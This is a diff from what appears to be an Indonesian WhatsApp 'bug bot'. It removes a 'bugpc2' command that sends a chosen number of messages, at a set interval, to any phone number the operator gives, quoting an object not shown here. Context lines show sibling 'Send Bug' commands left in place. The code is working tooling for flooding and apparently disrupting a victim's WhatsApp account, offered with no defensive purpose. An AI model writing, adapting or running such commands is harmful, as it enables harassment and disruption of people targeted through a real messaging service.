@@ -1246,23 +1246,6 @@ await sleep(ms(waktu))
 reply(`Sukses Send Bug By ZannExe`)
 }
 break
-case 'bugpc2': {
-if (!isRegistered) return replyReg(api.verif)
-if (isBan) return reply(api.ban)
-if (!isCreator) return reply(api.owner)
-if (args.length < 1) return m.reply(`*Syntax Error!*\n\nUse : ${command} number|amount spam|timer\nExample : ${command} 62888|1|10s\n\n\ns = Second/Detik`)
-num = q.split('|')[0]+'@s.whatsapp.net'
-jumlah = q.split('|')[1]
-waktu = q.split('|')[2]
-for (let i = 0; i < jumlah; i++) {
-sock.sendMessage(num, { text: 'Halo Guys Aku ZannExe Bug' }, { quoted: lep})
-await sleep(ms(waktu))
-}
-tekteka = `Success Send Bug By ZannExe To: ${num}\nAmount Spam: ${jumlah}\nTimer: ${waktu}`
-reply(tekteka)
-}
-addCmd(command.slice(0), 1, commund)
-break
 case 'bugpcs': {
 if (!isRegistered) return replyReg(api.verif)
 if (isBan) return reply(api.ban)
